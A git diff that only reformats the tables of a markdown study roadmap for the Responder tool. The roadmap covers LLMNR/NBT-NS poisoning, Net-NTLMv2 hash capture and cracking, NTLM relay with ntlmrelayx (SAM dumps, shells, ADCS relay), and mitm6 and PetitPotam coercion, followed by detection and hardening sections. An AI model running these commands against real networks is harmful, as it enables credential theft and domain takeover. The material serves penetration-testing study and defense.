@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | AD Recon & Enumeration | Credential Capture & Abuse | Lateral Movement | Privilege Escalation |
-|:-----------------------|:---------------------------|:-----------------|:---------------------|
+| :----------------------- | :--------------------------- | :----------------- | :--------------------- |
 | [[BloodHound\|🩸 BloodHound]] | **📡 Responder** (you are here) | [[NetExec\|🌐 NetExec]] | [[Mimikatz\|🐱 Mimikatz]] |
 | [[Kerbrute\|🔑 Kerbrute]] | [[Impacket\|🐍 Impacket]] | [[Evil-WinRM\|🪟 Evil-WinRM]] | [[Rubeus\|🎫 Rubeus]] |
-| [[Certipy\|🎫 Certipy]] | | [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] |
+| [[Certipy\|🎫 Certipy]] || [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 5 | 2–3 hours |
 | 2 | Running Responder | 5 | 2–3 hours |
 | 3 | Hash Capture and Cracking | 4 | 2–3 hours |
@@ -40,7 +40,7 @@
 | 6 | Detection and Defense | 3 | 1–2 hours |
 | 7 | Practical Labs | 4 | 4–6 hours |
 | 8 | Mastery Challenges | 3 | 3–5 hours |
-| | **Total** | **31** | **~19–30 hours** |
+|| **Total** | **31** | **~19–30 hours** |
 
 **Prerequisites:** Active Directory and Windows networking basics (DNS, NTLM authentication, SMB). Understanding of NTLMv1/NTLMv2 vs. NTLM hashes (the difference matters for cracking). LAN access (physical or VPN connected to the internal network segment).
 
@@ -55,7 +55,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **DNS Fallback Chain** | Windows: DNS query → if no answer → LLMNR broadcast (UDP 5355) → if no answer → NBT-NS broadcast (UDP 137). |
 | **LLMNR** | Link-Local Multicast Name Resolution. Sends a multicast to the entire local network segment asking "Does anyone know the IP for HOSTNAME?". |
 | **NBT-NS** | Older NetBIOS Name Service. Same concept, broadcasts on UDP 137. |
@@ -69,7 +69,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Challenge-Response** | NTLM: server sends a challenge → client responds with HMAC-MD5(NT_hash, challenge+client_nonce). |
 | **Net-NTLMv2** | The full challenge-response exchange captured by Responder. Format: `username::DOMAIN:challenge:response:blob`. This is what gets cracked. |
 | **NTLMv2 vs. NT Hash** | NT hash (from SAM/NTDS): can be used for Pass-the-Hash. Net-NTLMv2 (from Responder): cannot be used for PtH directly — must crack offline to get the cleartext password, or relay the challenge-response. |
@@ -82,7 +82,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kali** | Pre-installed. `responder --version`. |
 | **Manual** | `git clone https://github.com/lgandx/Responder`. |
 | **Config** | `/usr/share/responder/Responder.conf` — configure which protocols to poison and which to serve credentials to. |
@@ -94,7 +94,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Location** | `/usr/share/responder/Responder.conf`. |
 | **Key Settings** | `SQL = On/Off` — fake MSSQL server. `SMB = On/Off` — fake SMB server. `HTTP = On/Off` — fake HTTP server. `HTTPS = On/Off`. `LDAP = On/Off`. Turn off services that conflict with your actual services or that you're relaying to (SMB off if running ntlmrelayx against SMB). |
 | **Relay Mode** | Turn `SMB = Off` and `HTTP = Off` when running ntlmrelayx — Responder just poisons, ntlmrelayx handles the authentication. |
@@ -106,7 +106,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Flag** | `-I eth0` — interface to listen on. Must be the interface connected to the target network. |
 | **Multiple** | Can't listen on multiple interfaces simultaneously with one instance. Run two instances for different segments. |
 | **Find Interface** | `ip a` — find the interface name connected to the target subnet. |
@@ -122,7 +122,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `sudo responder -I eth0 -v`. |
 | **Wait** | Responder listens. When a Windows machine fires an LLMNR/NBT-NS query: Responder answers → captures the Net-NTLMv2 hash → displays it. |
 | **Analysis Mode** | `-A` — analyze only, don't poison. Just listen and report what LLMNR/NBT-NS traffic you see. Useful for understanding the environment before going active. |
@@ -134,7 +134,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Wait for Organic** | During business hours, authentication attempts happen organically from misconfigured clients. This is the safest approach (no noise). |
 | **Force Trigger** | From a compromised host, run a UNC path to a non-existent server: `net use \\DOESNOTEXIST\share` → triggers LLMNR broadcast → Responder captures. |
 | **Printer Exploit** | Any machine with network printer access: navigate to a printer's web admin → change spooler path to `\\attacker_ip\fake` → printer authenticates. Requires access to the printer admin. |
@@ -146,7 +146,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Files** | `/usr/share/responder/logs/` — per-user hash files and the main `Responder.db` SQLite database. |
 | **Format** | `NTLMv2-SSP-192.168.1.50.txt` — net-NTLMv2 hash from that IP. Format: `username::DOMAIN:challenge:response:blob`. |
 | **Database** | `Responder.db` — SQLite database with all captures. `sqlite3 Responder.db "SELECT * FROM responder;"`. |
@@ -158,7 +158,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SMB** | Default: fake SMB server captures NTLMv2. Most Windows authentication attempts. |
 | **HTTP** | `-w` flag: `sudo responder -I eth0 -w` — enables WPAD (Web Proxy Auto-Discovery) poisoning. Captures HTTP authentication from browsers looking for proxy config. |
 | **LDAP** | Captures LDAP authentication attempts (useful in environments with frequent LDAP queries). |
@@ -171,7 +171,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Windows browsers look for a WPAD (Web Proxy Auto-Discovery) file at `http://wpad/wpad.dat`. They first resolve `wpad` via DNS/LLMNR. |
 | **Attack** | Responder answers the WPAD hostname query → serves a malicious WPAD file → browser uses Responder as its proxy → Responder captures HTTP NTLM authentication. |
 | **Enable** | `sudo responder -I eth0 -wP` (WPAD + force authentication). |
@@ -188,7 +188,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Format** | Mode 5600 = Net-NTLMv2. |
 | **Command** | `hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`. |
 | **Speed** | NTLMv2 is relatively fast to crack on GPU. Significantly faster than bcrypt. rockyou + best64 rules covers most simple corporate passwords. |
@@ -200,7 +200,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `john --format=netntlmv2 --wordlist=rockyou.txt captured_hash.txt`. |
 | **Rules** | `john --format=netntlmv2 --wordlist=rockyou.txt --rules=best64 hash.txt`. |
 
@@ -211,7 +211,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Verify** | `crackmapexec smb target_ip -u cracked_user -p cracked_pass` — verify credentials work. |
 | **Use** | `evil-winrm -i target_ip -u cracked_user -p cracked_pass` — WinRM shell. `impacket-psexec domain/user:pass@target_ip` — admin shell. `impacket-smbclient domain/user:pass@target_ip` — browse shares. |
 
@@ -222,7 +222,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Multiple Captures** | Responder captures hashes from many users during the day. Crack all of them. |
 | **Priority** | Service accounts (often simple passwords, high privileges). Domain admins. IT staff. Shared accounts. |
 | **hashcat multiple** | `hashcat -m 5600 all_hashes.txt rockyou.txt --rules best64`. Cracks all at once. |
@@ -238,7 +238,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **What is Relay** | Instead of cracking the captured Net-NTLMv2 hash, relay it in real time to authenticate to another machine on the network. No cracking required — the hash is used as-is. |
 | **Requirement** | Target machine must NOT have SMB signing enforced. `crackmapexec smb network_range --gen-relay-list targets.txt` — finds machines without SMB signing. |
 | **Tool** | ntlmrelayx (part of Impacket). |
@@ -250,7 +250,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Step 1** | Edit `Responder.conf`: set `SMB = Off`, `HTTP = Off`. Responder poisons only — ntlmrelayx handles SMB/HTTP. |
 | **Step 2** | Start ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support`. |
 | **Step 3** | Start Responder: `sudo responder -I eth0`. |
@@ -263,7 +263,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SAM Dump** | `ntlmrelayx -tf targets.txt -smb2support` — default: dumps SAM (local accounts) from the target. |
 | **SOCKS Proxy** | `ntlmrelayx -tf targets.txt -smb2support -socks` — creates a SOCKS proxy using relayed sessions. Use with ProxyChains for any tool. |
 | **Interactive Shell** | `ntlmrelayx -tf targets.txt -smb2support -i` — interactive SMB shell session. |
@@ -276,7 +276,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 30 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **ADCS Relay (ESC8)** | Relay NTLM authentication to Active Directory Certificate Services HTTP enrollment endpoint. Requests a certificate for the victim user/computer. Use certificate for PKINIT authentication (Kerberos). |
 | **Command** | `ntlmrelayx -t http://ca_server/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`. |
 | **Impact** | Certificate for DC machine account → pass-the-certificate → TGT → domain compromise. |
@@ -292,7 +292,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **mitm6** | Separate tool for IPv6 MITM on Windows networks. Windows prefers IPv6 over IPv4 if available. mitm6 + ntlmrelayx is a powerful combo. |
 | **Concept** | mitm6 responds to DHCPv6 requests → becomes the IPv6 DNS server for victims. Redirects DNS queries to attacker. Victim authenticates to attacker → relay with ntlmrelayx. |
 | **Combined** | `sudo mitm6 -d target.domain` + `ntlmrelayx -6 -t ldaps://dc01 --delegate-access`. |
@@ -304,7 +304,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Analyze Mode** | `sudo responder -I eth0 -A` — listen only, no poisoning. See what LLMNR/NBT-NS queries are being broadcast. Identify: which hostnames are being queried, which machines are querying, frequency. This intelligence guides the attack. |
 
 ---
@@ -314,7 +314,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **PetitPotam** | Coerce Windows machines (including DCs) to authenticate to attacker via MS-EFSRPC. `PetitPotam.py attacker_ip target_ip`. Combined with ntlmrelayx → relay DC authentication to ADCS → DC certificate → domain compromise. |
 | **PrinterBug** | `printerbug.py domain/user:pass@target_ip attacker_ip` — coerce a machine to authenticate via spooler service. |
 | **Use** | These don't require Responder for coercion — they actively force authentication rather than waiting for organic broadcast traffic. |
@@ -330,7 +330,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Disable LLMNR** | GPO: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled. |
 | **Disable NBT-NS** | Network adapter properties → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP. Or via GPO registry key. |
 | **Enable SMB Signing** | Require SMB signing on all domain members — defeats relay attacks. GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server: Digitally sign communications. |
@@ -342,7 +342,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **SIEM Rules** | Alert on: a single machine answering many different LLMNR queries. NTLM authentication failures at unusual frequency. Machines authenticating to non-standard servers. |
 | **Network Monitoring** | Wireshark/SIEM: LLMNR responses from unexpected sources. NBT-NS responses from non-Windows-DNS servers. Multiple authentication failures from one source. |
 
@@ -353,7 +353,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **IOCs** | UDP 5355 (LLMNR) responses from non-authorized sources. UDP 137 (NBT-NS) responses from non-authorized sources. Net-NTLMv2 authentication attempts to unknown IPs. |
 
 ---
@@ -432,7 +432,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can explain LLMNR/NBT-NS and why they're vulnerable | ☐ |
 | Can run Responder and capture Net-NTLMv2 hashes | ☐ |
 | Can crack captured hashes with Hashcat and JtR | ☐ |
